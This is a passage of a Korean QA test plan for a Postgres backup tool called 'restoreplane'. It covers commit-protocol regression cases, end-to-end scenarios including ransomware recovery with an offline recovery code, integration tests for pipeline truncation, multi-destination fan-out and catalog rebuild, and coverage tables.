| SEC-COMMIT-04 | finish 순서 준수(inner→outer) | 계측을 통해 zstd.finish() → age.finish() → 스풀 flush 순서 확인 | 순서가 역전되거나 생략되면 커밋 로직이 실패로 처리(순서 위반 = 실패) |
| SEC-COMMIT-05 | "복사~커밋" 사이 early-return 금지 | 코드 경로 계측 — 파이프 복사 시작 후 커밋 완료 전 임의 지점에서 return하는 결함을 모의 주입 | early-return이 발생하면 해당 백업이 반드시 미커밋 상태로 남음(부분 커밋 없음), 이후 정리 로직이 고아 산출물을 청소 |
| SEC-COMMIT-06 | stderr 치명 패턴 감지 | exit code는 0이지만 stderr에 치명 경고 패턴(예: `pg_dump: error:`) 포함되도록 모의 | 종료코드만으로 성공 판정하지 않고 stderr 패턴 매칭으로 FAIL 처리 |
| SEC-COMMIT-07 | multipart-only-commit(S3) | S3 업로드 도중 강제 단절(파트 일부만 전송) | 미완료 멀티파트 업로드가 최종 객체로 노출되지 않음(CompleteMultipartUpload 전에는 목적지에서 유효 객체로 조회되지 않음), abort 또는 재시도로 정리 |

---

## E2E 테스트

각 시나리오는 operation-scenarios.md의 E2E 1~4를 pass/fail 판정 가능한 형태로 재구성한 것이다.

### E2E-1. 최초 셋업 → 첫 백업 → 검증

**우선순위**: P0
**전제**: 신규 설치, 접근 가능한 Postgres 서버 1대, S3(Object Lock Governance) + 로컬 NAS 목적지 2종 준비.

**절차**
1. init 완주(강한 비번, 복구코드 오프라인 보관 확인, DPAPI 등록, 서명키 생성, 왕복 검증 초록).
2. add-db로 Postgres 등록, test-connection 초록 확인.
3. add-dest로 S3(Object Lock Governance) + Local NAS 등록, S3 불변성 capability 배지 확인.
4. doctor 전체 실행 — 전 항목 초록 확인.
5. run 실행 — 파이프라인 로그(plan→버전검증→덤프→해시→압축→암호화→스풀→서명→업로드→L1/L2) 완주, 불변성 자가 테스트 "삭제 거부됨" 확인.
6. verify --level l3 실행 — 샌드박스 전체 복원, 행 수 대조 통과.

**Pass 기준**: 대시보드 상단 "모두 정상" 헤더, job 카드에 최근 백업 시각+불변 배지+L3 검증 배지+다음 예약이 모두 표시됨. 6단계 중 하나라도 실패하면 Fail.

**Fail 처리 확인**: 3단계에서 S3 버킷이 versioning OFF였다면 경고가 나타나야 하며, 이 경우 시나리오는 "경고 인지 후 재설정"까지 포함해야 Pass로 인정.

---

### E2E-2. 랜섬웨어 발생 → 다른 PC에서 복구 코드로 복원 (핵심 시나리오)

**우선순위**: P0 (프로젝트 존재 이유를 증명하는 시나리오 — 최고 우선순위)
**전제**: E2E-1이 이미 성공적으로 완료되어 S3에 불변 백업 1건 이상 존재. 원본 백업 PC와 DPAPI 캐시가 모두 소실된 상태를 재현(별도의 "새 PC" 환경 사용, 원본 PC의 keyfile/DPAPI blob 없이 진행).

**절차**
1. (사전 확인) 랜섬웨어 공격을 모의: 원본 백업 PC의 쓰기 자격증명(PutObject only)으로 S3 백업 객체에 대해 삭제/암호화 시도 → Object Lock Governance에 의해 거부됨을 재확인(SEC-H2-01과 연계).
2. 완전히 새로운 PC에 도구 설치: 공개 리포에서 코드만 clone, 오프사이트(리포 밖 별도 백업)에서 암호화 config를 가져옴. 이 PC에는 평문 secret/keyfile/DPAPI blob이 전혀 없음.
3. `restoreplane restore --backup <id> --to sandbox --recovery-code` 실행.
4. 서명 검증 게이트 통과 확인(위조 아님).
5. 키 경로 선택에서 DPAPI 옵션이 비활성(캐시 없음), 마스터 비번은 "모른다"고 가정 → 금고에 보관된 복구 코드 입력.
6. DEK unwrap 성공 → 복호화 → 해제 → 샌드박스 복원 완료, 행 수/체크섬 요약 확인.
7. 샌드박스 확인 후 실제(깨끗한) 운영 DB로 실복원(문구 재입력 마찰 통과).
8. 사고 후 위생 조치: `rotate-key --master-password`, `rotate-key --recovery-code`(재발급), `register-dpapi`(새 PC 재등록) 순서로 실행.

**Pass 기준**
- 원본 PC/DPAPI 캐시 없이, 오직 (a) 공개 리포의 코드 + (b) 오프사이트 암호화 config + (c) 금고 속 복구 코드만으로 데이터 복원 성공.
- 복원된 데이터의 행 수/체크섬이 랜섬웨어 발생 직전 상태와 일치.
- 8단계 사고 후 위생 조치가 모두 성공하고, 회전 후에도 과거 백업 접근성이 유지됨(ROTATE-001/003과 연계).

**Fail 조건(회귀 신호)**: 복구 코드만으로 unwrap이 실패하거나, DPAPI 캐시 의존이 암묵적으로 필요하다면 이는 "이식성 있는 신뢰 근원" 설계가 깨진 것이므로 최고 심각도 결함으로 분류.

---

### E2E-3. 서버 메이저 업그레이드 후 버전 불일치 감지

**우선순위**: P0
**전제**: Postgres 서버가 15→16으로 업그레이드됨. 번들 pg_dump는 아직 15. DB 2개 이상 등록(pg1: 업그레이드됨, pg2: 정상).

**절차**
1. 다음 무인 run 트리거(스케줄 또는 수동) — 매 run 버전 재검증 로직이 client_major(15) < server_major(16)를 감지.
2. pg1은 즉시 HARD FAIL로 정지(손상 덤프 생성 없음), pg2는 정상 진행.
3. 알림 채널(webhook/email)에 "pg1: client_major 15 < server_major 16, 백업 스킵됨" 통지 수신 확인.
4. `restoreplane doctor --db pg1` 실행 — 버전 매트릭스 항목 빨강, 감지된 서버/클라이언트 버전 표시 확인.
5. 번들 버전 매트릭스에서 pg_dump 16으로 갱신, doctor 재실행 시 초록 전환.
6. `restoreplane run --db pg1` 재실행 — 정상 백업 + L1/L2 검증 통과.

**Pass 기준**: 2단계에서 손상/절단 덤프가 목적지에 업로드되지 않음(HARD FAIL이 "조용한 실패"가 아니라 명시적 실패+알림+진단으로 드러남), pg2는 영향받지 않음, 6단계에서 정상 회복.

---

### E2E-4. 스케줄 무인 백업 catch-up

**우선순위**: P1
**전제**: 매일 03:00 cron 등록, StartWhenAvailable 설정, DPAPI 등록 완료.

**절차**
1. 03:00에 PC가 절전/종료 상태이도록 재현(테스트 환경에서 예약 시각을 지나도록 PC를 끈 상태로 유지).
2. PC를 03:00 이후(예: 08:00) 부팅.
3. StartWhenAvailable에 의해 밀린 백업이 부팅 후 자동으로 catch-up 실행되는지 확인.
4. catch-up 도중 우연히 수동 run을 동시에 트리거하여 overlap guard(named mutex/runs unique index)가 중복 실행을 스킵하는지 확인.
5. 무인 경로(DPAPI Machine-scope→KEK 복원→DEK unwrap→config 복호)가 사람 개입 없이 완료되는지 확인.
6. 완료/실패에 따른 알림 및 대시보드 "마지막 백업 시각" 갱신 확인.

**Pass 기준**: 절전/종료로 놓친 백업이 방치되지 않고 자동 만회됨. 4단계에서 두 실행 중 정확히 하나만 완료되고 다른 하나는 스킵 로그를 남김(둘 다 실행되어 스풀 경쟁이 발생하면 Fail).

---

## 통합 테스트

파이프라인 내부 이음매(seam)에 대한 화이트박스에 가까운 통합 테스트. 단위 테스트로는 잡히지 않는 컴포넌트 간 상호작용을 검증한다.

### INT-001. pipeline finish() 절단 방지 (통합 레벨)

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| INT-001-01 | zstd→age→스풀 전체 체인에서 임의 지점 강제 종료 | dump→blake3 tee→zstd::Encoder→age StreamWriter→로컬 스풀 체인의 5개 지점(덤프 시작 직후/zstd 50%/age 50%/flush 직전/flush 직후) 각각에서 프로세스 강제 종료 후 재시작 | flush 직후를 제외한 모든 지점에서 해당 백업이 catalog/목적지에 나타나지 않음. flush 직후 종료는 커밋된 것으로 취급되어도 무방(설계상 커밋 시점) |
| INT-001-02 | 부분 스풀 파일의 목적지 업로드 차단 | flush 이전 강제 종료로 생성된 불완전 스풀 파일을 수동으로 업로드 트리거 시도 | 업로드 로직이 미커밋 스풀 파일을 유효 백업으로 인식하지 않음(커밋 마커/매니페스트 부재로 업로드 대상에서 제외) |
| INT-001-03 | age 헤더 검증으로 절단 조기 탐지 | 백업 직후 즉시 복호화 헤더 검증(spec.md Risk Assessment 완화책) 실행 | 절단된 age 스트림은 헤더/MAC 검증에서 즉시 실패로 탐지되며 이 백업이 "완료"로 표시되지 않음 |

### INT-002. 부분 성공 팬아웃 (옵션 C, JoinSet)

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| INT-002-01 | 3목적지 중 1개만 실패 | S3/SSH/Local 3개 목적지 등록, run 도중 SSH만 강제 단절 | S3+Local 업로드 성공, SSH는 재시도 소진 후 실패, 최종 리포트가 목적지별 상태(성공/실패)를 개별적으로 명시하고 전체 상태는 "부분 성공"(오렌지)으로 표기, 종료코드가 완전성공/부분성공/전체실패를 구분 |
| INT-002-02 | 목적지별 독립 retry/resume | 업로드 도중 목적지 A만 일시 단절 후 복구 | 목적지 B/C는 A의 재시도 대기와 무관하게 병렬로 완료(JoinSet 독립성), A는 별도로 재시도 후 성공 |
| INT-002-03 | 실패 목적지의 부분 객체 정리 | 목적지 업로드 도중(예: S3 멀티파트 50%) 강제 실패 | 실패한 목적지에 완료되지 않은 부분 객체가 최종 조회 가능한 상태로 남지 않음(abort/정리) |
| INT-002-04 | 전 목적지 실패 시 전체 실패 처리 | 3목적지 모두 강제 단절 | catalog에 해당 백업이 "성공"으로 기록되지 않음, 알림에 전체 실패로 통지, 스풀 파일은 재시도용으로 보존 |
| INT-002-05 | 목적지별 capability 요구사항 위반 시 job 설계 검증 | job이 "불변 목적지 1개 이상 필수"를 요구하는데 등록된 목적지가 모두 비불변인 경우 | run 시작 전 또는 완료 후 리포트에 "불변 목적지 요구사항 미충족" 경고가 명확히 표시(조용히 비불변 목적지로만 완료 처리하지 않음) |

### INT-003. catalog rebuild — 매니페스트로부터 재구성

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| INT-003-01 | 로컬 catalog 완전 손실 후 재구성 | catalog.db 파일 삭제, 목적지에는 서명 매니페스트 N건 존재 | `restoreplane catalog rebuild --from s3-primary` 실행 후 재구성된 catalog의 backups/artifacts 레코드 수 = N, 각 필드가 매니페스트와 일치 |
| INT-003-02 | 로컬 catalog 변조 후 정합화 | catalog.db의 verified 플래그를 수동으로 조작(실제로는 미검증인데 verified=true로 변경) | rebuild 실행 시 매니페스트 기준으로 재구성되어 변조된 verified 값이 매니페스트의 실제 값으로 교정됨 |
| INT-003-03 | 위조 매니페스트가 목적지에 섞여 있는 경우 | 목적지에 서명 검증 실패하는 매니페스트 1건을 수동 주입 | rebuild가 해당 매니페스트를 catalog에 반영하지 않고 별도로 격리 보고, 나머지 정상 매니페스트는 정상 반영 |
| INT-003-04 | 다중 목적지 간 rebuild 소스 전환 | 1차 목적지(S3) 접근 불가 상태 | `catalog rebuild --from ssh-offsite`로 전환 시도 | 대체 목적지에서 정상적으로 rebuild 완료(다중 목적지의 이점 확인) |
| INT-003-05 | globals-DB pairs 정합성 재구성 | PG globals 백업과 DB 백업이 각각 별도 매니페스트로 존재 | rebuild 후 catalog에서 pairs_with_globals_backup_id 관계가 정확히 복원됨 |

### INT-004. 검증 파이프라인과 catalog/매니페스트 연동

| TC-ID | 검증 대상 | 절차 | 통과 기준 |
|---|---|---|---|
| INT-004-01 | verify 결과가 catalog에 레벨과 함께 기록 | L1→L2→L3 순차 verify 실행 | catalog의 verified 필드가 최종적으로 최고 통과 레벨(L3)로 기록, 레벨 미표기 없음 |
| INT-004-02 | verify 실패가 catalog에 정확히 반영 | L3 verify 중 행 수 불일치 유발 | catalog가 해당 백업을 unverified로 유지(이전 L1/L2 통과 기록은 보존하되 L3는 실패로 별도 기록), 알림 발송 |

---

## Summary — 커버리지 요약

| 영역 | 테스트 케이스 수 | P0 | P1 | P2 |
|---|---|---|---|---|
| 메뉴/명령별 — init | 8 | 5 | 2 | 1 |
| 메뉴/명령별 — doctor | 4 | 1 | 2 | 1 |
| 메뉴/명령별 — test-connection | 4 | 1 | 2 | 1 |
| 메뉴/명령별 — add-db | 4 | 1 | 3 | 0 |
| 메뉴/명령별 — add-dest | 4 | 1 | 2 | 1 |
| 메뉴/명령별 — run | 10 | 5 | 4 | 1 |
| 메뉴/명령별 — verify | 6 | 2 | 3 | 1 |
| 메뉴/명령별 — restore | 7 | 5 | 2 | 0 |
| 메뉴/명령별 — destination self-test | 8 | 6 | 2 | 0 |
| 메뉴/명령별 — schedule | 5 | 1 | 3 | 1 |
| 메뉴/명령별 — rotate-key | 7 | 3 | 4 | 0 |
| 메뉴/명령별 — prune/catalog rebuild | 4 | 3 | 1 | 0 |
| 보안 회귀 — C1 (DPAPI 구멍) | 5 | 5 | 0 | 0 |
| 보안 회귀 — C2 (정적 DEK) | 4 | 4 | 0 | 0 |
| 보안 회귀 — C3 (RCE/위조 서명) | 9 | 9 | 0 | 0 |
| 보안 회귀 — C4 (오프라인 브루트포스) | 5 | 5 | 0 | 0 |
| 보안 회귀 — H1/H2 (append-only) | 6 | 6 | 0 | 0 |
| 보안 회귀 — Commit Protocol | 7 | 7 | 0 | 0 |
| E2E | 4 | 3 | 1 | 0 |
| 통합 테스트 | 14 | 8 | 6 | 0 |
| **합계** | **125** | **76** | **37** | **6** |

### 커버리지 대 Critical Findings 매핑

| Finding(team-review.md) | 대응 테스트 케이스 |
|---|---|
| C1 DPAPI 구멍 | SEC-C1-01~05, INIT-005, ROTATE-006 |
| C2 정적 DEK | SEC-C2-01~04 |
| C3 RCE/위조 서명 | SEC-C3-01~09, VERIFY-004, RESTORE-004 |
| C4 오프라인 브루트포스 | SEC-C4-01~05, INIT-003 |
| H1/H2 append-only 미강제 | SEC-H1-01~02, SEC-H2-01~04, PRUNE-002, DESTSELF-004/005 |
| H3 메타데이터 유출 | ADDDB-004(자격증명 암호화), SEC-C4-03(리포 스캔에 config 포함) |
| H5 catalog 변조 | INT-003-01~05, CATREBUILD-001/002 |
| H6 공급망 | (본 문서 범위 밖 — CI 파이프라인 cargo-deny/audit 별도 테스트 필요, `[확인 필요]`) |
| P0-1/2/3 commit protocol | SEC-COMMIT-01~07, INT-001-01~03, RUN-010 |
| P0-4 팬아웃(옵션 C) | INT-002-01~05, RUN-006 |
| P0-5 SecretManager 분리 | SEC-C2-04, ROTATE-001/003 |
| P0-6/H5 catalog rebuild | INT-003-01~05 |
| DT globals | RUN-009, ADDDB-001 |
| DT 엔진스캔(MyISAM) | ADDDB-002, RUN-008 |
| DT 버전 재검증 | RUN-005, DOCTOR-002, E2E-3 |
| DT 검증 3레벨 | VERIFY-001~006, INT-004-01~02 |

### 알려진 커버리지 공백 (`[확인 필요]`)

- H6 공급망(Cargo.lock/cargo-deny/cargo-audit/바이너리 해시 검증)은 CI 파이프라인 테스트 영역으로, 본 QA 시나리오 문서 범위 밖 — 별도 CI 검증 체크리스트 필요.
- L3 검증 주기(주 1회+스키마 변경 시)의 자동 트리거 테스트는 스케줄러 통합이 구현된 이후 추가 필요(plan.md Open Questions 미확정 항목).
- mydumper 전환 임계치, max_parallel_dumps 튜닝 테스트는 "DB 실제 대수/최대 크기" 확정(Open Questions) 이후 케이스 구체화 필요.

---

`#tags: qa-scenarios, db-backup, ransomware, test-cases, security-regression, e2e-test, integration-test`
